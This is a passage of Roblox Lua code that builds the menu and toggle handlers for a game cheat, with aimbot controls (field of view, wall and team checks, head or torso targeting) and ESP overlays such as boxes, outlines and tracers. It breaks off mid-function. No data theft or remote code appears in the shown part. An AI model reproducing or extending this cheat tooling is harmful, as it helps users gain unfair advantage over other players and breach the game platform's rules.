    OE.Size = UDim2.new(0, 164, 0, 29)
    OE.Font = Enum.Font.Gotham
    OE.Text = "Outlines"
    OE.TextColor3 = Color3.fromRGB(255, 255, 255)
    OE.TextSize = 16.000
    
    OTC.Name = "OTC"
    OTC.Parent = ESPSection_2
    OTC.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    OTC.BorderColor3 = Color3.fromRGB(255, 255, 255)
    OTC.Position = UDim2.new(0.234439835, 0, 0.139479905, 0)
    OTC.Size = UDim2.new(0, 164, 0, 29)
    OTC.Font = Enum.Font.Gotham
    OTC.Text = "Team Check"
    OTC.TextColor3 = Color3.fromRGB(255, 255, 255)
    OTC.TextSize = 16.000
    
    Frame_4.Parent = ESPSection_2
    Frame_4.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Frame_4.BackgroundTransparency = 0.700
    Frame_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Frame_4.BorderSizePixel = 0
    Frame_4.Position = UDim2.new(-0.550000012, 0, 0.739130437, 0)
    Frame_4.Size = UDim2.new(0, 230, 0, 50)
    
    Slider1.Name = "Slider1"
    Slider1.Parent = Frame_4
    Slider1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Slider1.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Slider1.BorderSizePixel = 0
    Slider1.Position = UDim2.new(0.0629399866, 0, 0.45120728, 0)
    Slider1.Size = UDim2.new(0, 200, 0, 15)
    
    UICorner_5.Parent = Slider1
    
    Fill3.Name = "Fill3"
    Fill3.Parent = Slider1
    Fill3.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
    Fill3.BackgroundTransparency = 0.200
    Fill3.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Fill3.BorderSizePixel = 0
    Fill3.Size = UDim2.new(0, 100, 0, 15)
    -- Made By Mick Gordon
    UICorner_6.Parent = Fill3
    
    UIGradient_3.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(17, 223, 255)), ColorSequenceKeypoint.new(0.29, Color3.fromRGB(17, 223, 255)), ColorSequenceKeypoint.new(0.43, Color3.fromRGB(18, 218, 249)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(52, 52, 52))}
    UIGradient_3.Parent = Fill3
    
    TriggerOutTans.Name = "TriggerOutTans"
    TriggerOutTans.Parent = Slider1
    TriggerOutTans.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TriggerOutTans.BackgroundTransparency = 1.000
    TriggerOutTans.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TriggerOutTans.BorderSizePixel = 0
    TriggerOutTans.Size = UDim2.new(1, 0, 1, 0)
    TriggerOutTans.Font = Enum.Font.SourceSans
    TriggerOutTans.Text = ""
    TriggerOutTans.TextColor3 = Color3.fromRGB(0, 0, 0)
    TriggerOutTans.TextSize = 14.000
    
    Numbers_3.Name = "Numbers"
    Numbers_3.Parent = Frame_4
    Numbers_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Numbers_3.BackgroundTransparency = 1.000
    Numbers_3.BorderColor3 = Color3.fromRGB(255, 255, 255)
    Numbers_3.BorderSizePixel = 0
    Numbers_3.Position = UDim2.new(0.79130435, 0, 0, 0)
    Numbers_3.Size = UDim2.new(0, 50, 0, 23)
    Numbers_3.Font = Enum.Font.Gotham
    Numbers_3.Text = "50"
    Numbers_3.TextColor3 = Color3.fromRGB(255, 255, 255)
    Numbers_3.TextSize = 14.000
    
    TextLabel_9.Parent = Frame_4
    TextLabel_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_9.BackgroundTransparency = 1.000
    TextLabel_9.BorderColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_9.BorderSizePixel = 0
    TextLabel_9.Position = UDim2.new(0.0608695634, 0, 0, 0)
    TextLabel_9.Size = UDim2.new(0, 125, 0, 23)
    TextLabel_9.Font = Enum.Font.Gotham
    TextLabel_9.Text = "Outlines Transparency"
    TextLabel_9.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_9.TextSize = 14.000
    
    Frame_5.Parent = ESPSection_2
    Frame_5.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Frame_5.BackgroundTransparency = 0.700
    Frame_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Frame_5.BorderSizePixel = 0
    Frame_5.Position = UDim2.new(-0.550000012, 0, 0.739130437, 0)
    Frame_5.Size = UDim2.new(0, 230, 0, 50)
    
    Slider2.Name = "Slider2"
    Slider2.Parent = Frame_5
    Slider2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Slider2.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Slider2.BorderSizePixel = 0
    Slider2.Position = UDim2.new(0.0629399866, 0, 0.45120728, 0)
    Slider2.Size = UDim2.new(0, 200, 0, 15)
    
    UICorner_7.Parent = Slider2
    
    Fill4.Name = "Fill4"
    Fill4.Parent = Slider2
    Fill4.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
    Fill4.BackgroundTransparency = 0.200
    Fill4.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Fill4.BorderSizePixel = 0
    Fill4.Size = UDim2.new(0, 100, 0, 15)
    -- Made By Mick Gordon
    UICorner_8.Parent = Fill4
    
    UIGradient_4.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(17, 223, 255)), ColorSequenceKeypoint.new(0.29, Color3.fromRGB(17, 223, 255)), ColorSequenceKeypoint.new(0.43, Color3.fromRGB(18, 218, 249)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(52, 52, 52))}
    UIGradient_4.Parent = Fill4
    
    TriggerFill.Name = "TriggerFill"
    TriggerFill.Parent = Slider2
    TriggerFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TriggerFill.BackgroundTransparency = 1.000
    TriggerFill.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TriggerFill.BorderSizePixel = 0
    TriggerFill.Size = UDim2.new(1, 0, 1, 0)
    TriggerFill.Font = Enum.Font.SourceSans
    TriggerFill.Text = ""
    TriggerFill.TextColor3 = Color3.fromRGB(0, 0, 0)
    TriggerFill.TextSize = 14.000
    
    Numbers_4.Name = "Numbers"
    Numbers_4.Parent = Frame_5
    Numbers_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Numbers_4.BackgroundTransparency = 1.000
    Numbers_4.BorderColor3 = Color3.fromRGB(255, 255, 255)
    Numbers_4.BorderSizePixel = 0
    Numbers_4.Position = UDim2.new(0.79130435, 0, 0, 0)
    Numbers_4.Size = UDim2.new(0, 50, 0, 23)
    Numbers_4.Font = Enum.Font.Gotham
    Numbers_4.Text = "50"
    Numbers_4.TextColor3 = Color3.fromRGB(255, 255, 255)
    Numbers_4.TextSize = 14.000
    
    TextLabel_10.Parent = Frame_5
    TextLabel_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_10.BackgroundTransparency = 1.000
    TextLabel_10.BorderColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_10.BorderSizePixel = 0
    TextLabel_10.Position = UDim2.new(0.104347825, 0, 0, 0)
    TextLabel_10.Size = UDim2.new(0, 133, 0, 23)
    TextLabel_10.Font = Enum.Font.Gotham
    TextLabel_10.Text = "Fill Outlines Transparency"
    TextLabel_10.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_10.TextSize = 14.000
    -- Made By Mick Gordon
    TextLabel_11.Parent = ESPSection_2
    TextLabel_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_11.BackgroundTransparency = 1.000
    TextLabel_11.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel_11.BorderSizePixel = 0
    TextLabel_11.Position = UDim2.new(0.0700000003, 0, 0.20869565, 0)
    TextLabel_11.Size = UDim2.new(0, 100, 0, 17)
    TextLabel_11.Font = Enum.Font.Gotham
    TextLabel_11.Text = "Outlines"
    TextLabel_11.TextColor3 = Color3.fromRGB(17, 223, 255)
    TextLabel_11.TextSize = 21.000
    
    Frame_6.Parent = ESPSection_2
    Frame_6.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Frame_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Frame_6.BorderSizePixel = 0
    Frame_6.Position = UDim2.new(0.0909090936, 0, 0.600000739, 0)
    Frame_6.Size = UDim2.new(0, 100, 0, 30)
    
    UIListLayout_5.Parent = Frame_6
    UIListLayout_5.FillDirection = Enum.FillDirection.Horizontal
    UIListLayout_5.HorizontalAlignment = Enum.HorizontalAlignment.Center
    UIListLayout_5.SortOrder = Enum.SortOrder.LayoutOrder
    UIListLayout_5.VerticalAlignment = Enum.VerticalAlignment.Center
    UIListLayout_5.Padding = UDim.new(0, 5)
    
    Outlines_R.Name = "Outlines_R"
    Outlines_R.Parent = Frame_6
    Outlines_R.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Outlines_R.BorderColor3 = Color3.fromRGB(255, 255, 255)
    Outlines_R.Size = UDim2.new(0, 75, 0, 24)
    Outlines_R.ClearTextOnFocus = false
    Outlines_R.Font = Enum.Font.Gotham
    Outlines_R.PlaceholderText = "255 - 0"
    Outlines_R.Text = "255"
    Outlines_R.TextColor3 = Color3.fromRGB(255, 255, 255)
    Outlines_R.TextSize = 14.000
    
    Outlines_G.Name = "Outlines_G"
    Outlines_G.Parent = Frame_6
    Outlines_G.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Outlines_G.BorderColor3 = Color3.fromRGB(255, 255, 255)
    Outlines_G.Size = UDim2.new(0, 75, 0, 24)
    Outlines_G.ClearTextOnFocus = false
    Outlines_G.Font = Enum.Font.Gotham
    Outlines_G.PlaceholderText = "255 - 0"
    Outlines_G.Text = "255"
    Outlines_G.TextColor3 = Color3.fromRGB(255, 255, 255)
    Outlines_G.TextSize = 14.000
    
    Outlines_B.Name = "Outlines_B"
    Outlines_B.Parent = Frame_6
    Outlines_B.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Outlines_B.BorderColor3 = Color3.fromRGB(255, 255, 255)
    Outlines_B.Size = UDim2.new(0, 75, 0, 24)
    Outlines_B.ClearTextOnFocus = false
    Outlines_B.Font = Enum.Font.Gotham
    Outlines_B.PlaceholderText = "255 - 0"
    Outlines_B.Text = "255"
    Outlines_B.TextColor3 = Color3.fromRGB(255, 255, 255)
    Outlines_B.TextSize = 14.000
    -- Made By Mick Gordon
    TextLabel_12.Parent = ESPSection_2
    TextLabel_12.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_12.BackgroundTransparency = 1.000
    TextLabel_12.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel_12.BorderSizePixel = 0
    TextLabel_12.Position = UDim2.new(0.0700000003, 0, 0.20869565, 0)
    TextLabel_12.Size = UDim2.new(0, 100, 0, 17)
    TextLabel_12.Font = Enum.Font.Gotham
    TextLabel_12.Text = "Fill Outlines"
    TextLabel_12.TextColor3 = Color3.fromRGB(17, 223, 255)
    TextLabel_12.TextSize = 21.000
    
    Frame_7.Parent = ESPSection_2
    Frame_7.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Frame_7.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Frame_7.BorderSizePixel = 0
    Frame_7.Position = UDim2.new(0.0909090936, 0, 0.600000739, 0)
    Frame_7.Size = UDim2.new(0, 100, 0, 30)
    
    UIListLayout_6.Parent = Frame_7
    UIListLayout_6.FillDirection = Enum.FillDirection.Horizontal
    UIListLayout_6.HorizontalAlignment = Enum.HorizontalAlignment.Center
    UIListLayout_6.SortOrder = Enum.SortOrder.LayoutOrder
    UIListLayout_6.VerticalAlignment = Enum.VerticalAlignment.Center
    UIListLayout_6.Padding = UDim.new(0, 5)
    
    FillOutlines_R.Name = "FillOutlines_R"
    FillOutlines_R.Parent = Frame_7
    FillOutlines_R.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    FillOutlines_R.BorderColor3 = Color3.fromRGB(255, 255, 255)
    FillOutlines_R.Size = UDim2.new(0, 75, 0, 24)
    FillOutlines_R.ClearTextOnFocus = false
    FillOutlines_R.Font = Enum.Font.Gotham
    FillOutlines_R.PlaceholderText = "255 - 0"
    FillOutlines_R.Text = "255"
    FillOutlines_R.TextColor3 = Color3.fromRGB(255, 255, 255)
    FillOutlines_R.TextSize = 14.000
    
    FillOutlines_G.Name = "FillOutlines_G"
    FillOutlines_G.Parent = Frame_7
    FillOutlines_G.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    FillOutlines_G.BorderColor3 = Color3.fromRGB(255, 255, 255)
    FillOutlines_G.Size = UDim2.new(0, 75, 0, 24)
    FillOutlines_G.ClearTextOnFocus = false
    FillOutlines_G.Font = Enum.Font.Gotham
    FillOutlines_G.PlaceholderText = "255 - 0"
    FillOutlines_G.Text = "255"
    FillOutlines_G.TextColor3 = Color3.fromRGB(255, 255, 255)
    FillOutlines_G.TextSize = 14.000
    
    FillOutlines_B.Name = "FillOutlines_B"
    FillOutlines_B.Parent = Frame_7
    FillOutlines_B.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    FillOutlines_B.BorderColor3 = Color3.fromRGB(255, 255, 255)
    FillOutlines_B.Size = UDim2.new(0, 75, 0, 24)
    FillOutlines_B.ClearTextOnFocus = false
    FillOutlines_B.Font = Enum.Font.Gotham
    FillOutlines_B.PlaceholderText = "255 - 0"
    FillOutlines_B.Text = "255"
    FillOutlines_B.TextColor3 = Color3.fromRGB(255, 255, 255)
    FillOutlines_B.TextSize = 14.000
    -- Made By Mick Gordon
    Tracerssection.Name = "Tracers section"
    Tracerssection.Parent = DeleteMobF
    Tracerssection.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Tracerssection.BackgroundTransparency = 1.000
    Tracerssection.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Tracerssection.BorderSizePixel = 0
    Tracerssection.Position = UDim2.new(0.682779849, 0, 0.158000082, 0)
    Tracerssection.Size = UDim2.new(0, 100, 0, 334)
    
    UIListLayout_7.Parent = Tracerssection
    UIListLayout_7.HorizontalAlignment = Enum.HorizontalAlignment.Center
    UIListLayout_7.SortOrder = Enum.SortOrder.LayoutOrder
    UIListLayout_7.Padding = UDim.new(0, 5)
    
    TE.Name = "TE"
    TE.Parent = Tracerssection
    TE.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    TE.BorderColor3 = Color3.fromRGB(255, 255, 255)
    TE.Position = UDim2.new(0.234439835, 0, 0.139479905, 0)
    TE.Size = UDim2.new(0, 164, 0, 29)
    TE.Font = Enum.Font.Gotham
    TE.Text = "Tracers"
    TE.TextColor3 = Color3.fromRGB(255, 255, 255)
    TE.TextSize = 16.000
    
    TTC.Name = "TTC"
    TTC.Parent = Tracerssection
    TTC.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    TTC.BorderColor3 = Color3.fromRGB(255, 255, 255)
    TTC.Position = UDim2.new(0.234439835, 0, 0.139479905, 0)
    TTC.Size = UDim2.new(0, 164, 0, 29)
    TTC.Font = Enum.Font.Gotham
    TTC.Text = "Team Check"
    TTC.TextColor3 = Color3.fromRGB(255, 255, 255)
    TTC.TextSize = 16.000
    
    TTCOlor.Name = "TTCOlor"
    TTCOlor.Parent = Tracerssection
    TTCOlor.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    TTCOlor.BorderColor3 = Color3.fromRGB(255, 255, 255)
    TTCOlor.Position = UDim2.new(0.234439835, 0, 0.139479905, 0)
    TTCOlor.Size = UDim2.new(0, 164, 0, 29)
    TTCOlor.Font = Enum.Font.Gotham
    TTCOlor.Text = "Team Color"
    TTCOlor.TextColor3 = Color3.fromRGB(255, 255, 255)
    TTCOlor.TextSize = 16.000
    
    Frame_8.Parent = Tracerssection
    Frame_8.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Frame_8.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Frame_8.BorderSizePixel = 0
    Frame_8.Position = UDim2.new(0.0909090936, 0, 0.600000739, 0)
    Frame_8.Size = UDim2.new(0, 100, 0, 40)
    
    UIListLayout_8.Parent = Frame_8
    UIListLayout_8.FillDirection = Enum.FillDirection.Horizontal
    UIListLayout_8.HorizontalAlignment = Enum.HorizontalAlignment.Center
    UIListLayout_8.SortOrder = Enum.SortOrder.LayoutOrder
    UIListLayout_8.VerticalAlignment = Enum.VerticalAlignment.Center
    UIListLayout_8.Padding = UDim.new(0, 5)
    
    Tracers_R.Name = "Tracers_R"
    Tracers_R.Parent = Frame_8
    Tracers_R.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Tracers_R.BorderColor3 = Color3.fromRGB(255, 255, 255)
    Tracers_R.Size = UDim2.new(0, 75, 0, 24)
    Tracers_R.ClearTextOnFocus = false
    Tracers_R.Font = Enum.Font.Gotham
    Tracers_R.PlaceholderText = "255 - 0"
    Tracers_R.Text = "75" 
    Tracers_R.TextColor3 = Color3.fromRGB(255, 255, 255)
    Tracers_R.TextSize = 14.000
    
    Tracers_G.Name = "Tracers_G"
    Tracers_G.Parent = Frame_8
    Tracers_G.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Tracers_G.BorderColor3 = Color3.fromRGB(255, 255, 255)
    Tracers_G.Size = UDim2.new(0, 75, 0, 24)
    Tracers_G.ClearTextOnFocus = false
    Tracers_G.Font = Enum.Font.Gotham
    Tracers_G.PlaceholderText = "255 - 0"
    Tracers_G.Text = "0"
    Tracers_G.TextColor3 = Color3.fromRGB(255, 255, 255)
    Tracers_G.TextSize = 14.000
    
    Tracers_B.Name = "Tracers_B"
    Tracers_B.Parent = Frame_8
    Tracers_B.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Tracers_B.BorderColor3 = Color3.fromRGB(255, 255, 255)
    Tracers_B.Size = UDim2.new(0, 75, 0, 24)
    Tracers_B.ClearTextOnFocus = false
    Tracers_B.Font = Enum.Font.Gotham
    Tracers_B.PlaceholderText = "255 - 0"
    Tracers_B.Text = "10"
    Tracers_B.TextColor3 = Color3.fromRGB(255, 255, 255)
    Tracers_B.TextSize = 14.000
    -- Made By Mick Gordon
    Unknown.Name = "Unknown"
    Unknown.Parent = DeleteMobF
    Unknown.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Unknown.BackgroundTransparency = 1.000
    Unknown.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Unknown.BorderSizePixel = 0
    Unknown.Position = UDim2.new(0.882285178, 0, 0.158000082, 0)
    Unknown.Size = UDim2.new(0, 100, 0, 334)
    
    UIListLayout_9.Parent = Unknown
    UIListLayout_9.HorizontalAlignment = Enum.HorizontalAlignment.Center
    UIListLayout_9.SortOrder = Enum.SortOrder.LayoutOrder
    UIListLayout_9.Padding = UDim.new(0, 5)
    
    TextLabel_13.Parent = Unknown
    TextLabel_13.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_13.BackgroundTransparency = 1.000
    TextLabel_13.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel_13.BorderSizePixel = 0
    TextLabel_13.Position = UDim2.new(0.0700000003, 0, 0.20869565, 0)
    TextLabel_13.Size = UDim2.new(0, 100, 0, 17)
    TextLabel_13.Font = Enum.Font.Gotham
    TextLabel_13.Text = "More Options"
    TextLabel_13.TextColor3 = Color3.fromRGB(17, 223, 255)
    TextLabel_13.TextSize = 21.000
    
    TextLabel_14.Parent = Unknown
    TextLabel_14.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_14.BackgroundTransparency = 1.000
    TextLabel_14.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel_14.BorderSizePixel = 0
    TextLabel_14.Position = UDim2.new(0.215919182, 0, 0.100655407, 0)
    TextLabel_14.Size = UDim2.new(0, 100, 0, 17)
    TextLabel_14.Font = Enum.Font.Gotham
    TextLabel_14.Text = "Later"
    TextLabel_14.TextColor3 = Color3.fromRGB(17, 223, 255)
    TextLabel_14.TextSize = 18.000
    
    Open.Name = "Open"
    Open.Parent = CheatEngineDeleteMob
    Open.BackgroundColor3 = Color3.fromRGB(51, 51, 51)
    Open.BorderColor3 = Color3.fromRGB(255, 255, 255)
    Open.Position = UDim2.new(0.5, 0, 0.0199999996, 0)
    Open.Size = UDim2.new(0, 150, 0, 50)
    Open.ZIndex = 10
    Open.Visible = DeleteMob.GUi.OpenNCloseButton
    Open.Draggable = true
    Open.Active = true
    
    TextButton.Parent = Open
    TextButton.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
    TextButton.BorderColor3 = Color3.fromRGB(255, 255, 255)
    TextButton.Position = UDim2.new(0, 0, 0.319999933, 0)
    TextButton.Size = UDim2.new(0, 150, 0, 34)
    TextButton.Font = Enum.Font.Gotham
    TextButton.Text = "open / Close"
    TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextButton.TextSize = 14.000
    
    PLAYER:GetMouse().KeyDown:Connect(function(KeyPressed) -- What The Fuck
        if KeyPressed == (DeleteMob.GUi.Keybind) and DeleteMob.GUi.KeybindEnable then
            if DeleteMobF.Visible == true then
                DeleteMobF.Visible = false
            else
                DeleteMobF.Visible = true
            end
        end
        if KeyPressed == (DeleteMob.Aimbot.Keybind) and DeleteMob.Aimbot.Enabled then
            DeleteMob.Aimbot.IsAimKeyDown = true
        end
    end)
    PLAYER:GetMouse().KeyUp:Connect(function(KeyPressed) 
        if KeyPressed == (DeleteMob.Aimbot.Keybind) and DeleteMob.Aimbot.Enabled then
            DeleteMob.Aimbot.IsAimKeyDown = false
        end
    end)
    
    PLAYER:GetMouse().Button1Down:Connect(function()
        if DeleteMob.Aimbot.Keybind == "MouseButton1" and DeleteMob.Aimbot.Enabled then
            DeleteMob.Aimbot.IsAimKeyDown = true
        end
    end)
    PLAYER:GetMouse().Button1Up:Connect(function()
        if DeleteMob.Aimbot.Keybind == "MouseButton1" and DeleteMob.Aimbot.Enabled then
            DeleteMob.Aimbot.IsAimKeyDown = false
        end
    end)
    PLAYER:GetMouse().Button2Down:Connect(function()
        if DeleteMob.Aimbot.Keybind == "MouseButton2" and DeleteMob.Aimbot.Enabled then
            DeleteMob.Aimbot.IsAimKeyDown = true
        end
    end)
    PLAYER:GetMouse().Button2Up:Connect(function()
        if DeleteMob.Aimbot.Keybind == "MouseButton2" and DeleteMob.Aimbot.Enabled then
            DeleteMob.Aimbot.IsAimKeyDown = false
        end
    end)
    
    -- Made By Mick Gordon
    ABE.MouseButton1Click:Connect(function()
        if ABE.BackgroundColor3 == Color3.fromRGB(52, 52, 52) then
            ABE.BackgroundColor3 = Color3.fromRGB(2, 54, 8)
            DeleteMob.Aimbot.Enabled = true
        else
            ABE.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
            DeleteMob.Aimbot.Enabled = false	
        end
    end)
    
    ABSF.MouseButton1Click:Connect(function()
        if ABSF.BackgroundColor3 == Color3.fromRGB(52, 52, 52) then
            ABSF.BackgroundColor3 = Color3.fromRGB(2, 54, 8)
            DeleteMob.Aimbot.ShowFov = true
        else
            ABSF.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
            DeleteMob.Aimbot.ShowFov = false	
        end
    end)
    
    ABTC.MouseButton1Click:Connect(function()
        if ABTC.BackgroundColor3 == Color3.fromRGB(52, 52, 52) then
            ABTC.BackgroundColor3 = Color3.fromRGB(2, 54, 8)
            DeleteMob.Aimbot.TeamCheck = true
        else
            ABTC.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
            DeleteMob.Aimbot.TeamCheck = false	
        end
    end)
    
    ABWC.MouseButton1Click:Connect(function()
        if ABWC.BackgroundColor3 == Color3.fromRGB(52, 52, 52) then
            ABWC.BackgroundColor3 = Color3.fromRGB(2, 54, 8)
            DeleteMob.Aimbot.WallCheck = true
        else
            ABWC.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
            DeleteMob.Aimbot.WallCheck = false	
        end
    end)
    
    Allways_Show.MouseButton1Click:Connect(function()
        if DeleteMob.Aimbot.AimPart == "Head" then
            Allways_Show.Text = "head, TORSO"
            DeleteMob.Aimbot.AimPart = "HumanoidRootPart"
        else
            Allways_Show.Text = "HEAD, torso"
            DeleteMob.Aimbot.AimPart = "Head"
        end
    end)
    
    -- Box ESP
    
    BBD.MouseButton1Click:Connect(function()
        if BBD.BackgroundColor3 == Color3.fromRGB(52, 52, 52) then
            BBD.BackgroundColor3 = Color3.fromRGB(2, 54, 8)
            DeleteMob.ESP.Box.Distance = true
        else
            BBD.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
            DeleteMob.ESP.Box.Distance = false	
        end
    end)
    
    BBE.MouseButton1Click:Connect(function()
        if BBE.BackgroundColor3 == Color3.fromRGB(52, 52, 52) then
            BBE.BackgroundColor3 = Color3.fromRGB(2, 54, 8)
            DeleteMob.ESP.Box.Box = true
        else
            BBE.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
            DeleteMob.ESP.Box.Box = false	
        end
    end)
    
    BBH.MouseButton1Click:Connect(function()
        if BBH.BackgroundColor3 == Color3.fromRGB(52, 52, 52) then
            BBH.BackgroundColor3 = Color3.fromRGB(2, 54, 8)
            DeleteMob.ESP.Box.Health = true
        else
            BBH.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
            DeleteMob.ESP.Box.Health = false	
        end
    end)
    
    BBHT.MouseButton1Click:Connect(function()
        if DeleteMob.ESP.Box.HealthType == "Bar" then
            BBHT.Text = "bar, TEXT, both"
            DeleteMob.ESP.Box.HealthType = "Text"
        elseif DeleteMob.ESP.Box.HealthType == "Text" then
            BBHT.Text = "bar, text, BOTH"
            DeleteMob.ESP.Box.HealthType = "Both"
        elseif DeleteMob.ESP.Box.HealthType == "Both" then
            BBHT.Text = "BAR, text, both"
            DeleteMob.ESP.Box.HealthType = "Bar"
        end
    end)
    
    BBN.MouseButton1Click:Connect(function()
        if BBN.BackgroundColor3 == Color3.fromRGB(52, 52, 52) then
            BBN.BackgroundColor3 = Color3.fromRGB(2, 54, 8)
            DeleteMob.ESP.Box.Name = true
        else
            BBN.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
            DeleteMob.ESP.Box.Name = false	
        end
    end)
    
    BTC.MouseButton1Click:Connect(function()
        if BTC.BackgroundColor3 == Color3.fromRGB(52, 52, 52) then
            BTC.BackgroundColor3 = Color3.fromRGB(2, 54, 8)
            DeleteMob.ESP.Box.TeamCheck = true
        else
            BTC.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
            DeleteMob.ESP.Box.TeamCheck = false	
        end
    end)
    -- Outlines
    
    OE.MouseButton1Click:Connect(function()
        if OE.BackgroundColor3 == Color3.fromRGB(52, 52, 52) then
            OE.BackgroundColor3 = Color3.fromRGB(2, 54, 8)
            DeleteMob.ESP.OutLines.Enabled = true
        else
            OE.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
            DeleteMob.ESP.OutLines.Enabled = false	
        end
    end)
    
    OTC.MouseButton1Click:Connect(function()
        if OTC.BackgroundColor3 == Color3.fromRGB(52, 52, 52) then
            OTC.BackgroundColor3 = Color3.fromRGB(2, 54, 8)
            DeleteMob.ESP.OutLines.TeamCheck = true
        else
            OTC.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
            DeleteMob.ESP.OutLines.TeamCheck = false	
        end
    end)
    
    -- Tracers
    
    TE.MouseButton1Click:Connect(function()
        if TE.BackgroundColor3 == Color3.fromRGB(52, 52, 52) then
            TE.BackgroundColor3 = Color3.fromRGB(2, 54, 8)
            DeleteMob.ESP.Tracers.Enabled = true
        else
            TE.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
            DeleteMob.ESP.Tracers.Enabled = false	
        end
    end)
    
    TTC.MouseButton1Click:Connect(function()
        if TTC.BackgroundColor3 == Color3.fromRGB(52, 52, 52) then
            TTC.BackgroundColor3 = Color3.fromRGB(2, 54, 8)
            DeleteMob.ESP.Tracers.TeamCheck = true
        else
            TTC.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
            DeleteMob.ESP.Tracers.TeamCheck = false	
        end
    end)
    
    TTCOlor.MouseButton1Click:Connect(function()
        if TTCOlor.BackgroundColor3 == Color3.fromRGB(52, 52, 52) then
            TTCOlor.BackgroundColor3 = Color3.fromRGB(2, 54, 8)
            DeleteMob.ESP.Tracers.TeamColor = true
        else
            TTCOlor.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
            DeleteMob.ESP.Tracers.TeamColor = false	
        end
    end)
    
    -- UI Toggle
    
    TextButton.MouseButton1Click:Connect(function()
        if DeleteMobF.Visible == true then
            DeleteMobF.Visible = false
        else
            DeleteMobF.Visible = true
        end
    end)
    
    
    -- Scripts:
    
    local function LDTZWMY_fake_script() -- Slider3.Script1 
        local Mouse = game.Players.LocalPlayer:GetMouse()
        local Slider = Slider3
        local Fill = Fill1
        local Trigger = TriggerFov
        local TextNumbers = Numbers
        
        local maxvalue = 7 or 700/700
        local startingvalue = 0 or 0/100
        
        Fill.Size = UDim2.fromScale(DeleteMob.Aimbot.Fov,1)
        TextNumbers.Text = tostring(math.round(DeleteMob.Aimbot.Fov*100))
        
        local TweenService = game:GetService("TweenService")
        local TweenStyle =  TweenInfo.new(0.25, Enum.EasingStyle.Exponential)
        
        local function UpdateSlider()
            local OutPut = math.clamp(((Vector2.new(Mouse.X,Mouse.Y)-Slider.AbsolutePosition)/Slider.AbsoluteSize).X,0,1)
            
            if DeleteMob.Aimbot.Fov ~= OutPut then
                TweenService:Create(Fill,TweenStyle,{Size = UDim2.fromScale(OutPut,1)}):Play()
            end
            
            DeleteMob.Aimbot.Fov = (startingvalue +(OutPut*(maxvalue-startingvalue)))*100
            TextNumbers.Text = tostring(math.round(DeleteMob.Aimbot.Fov*100))
        end
        
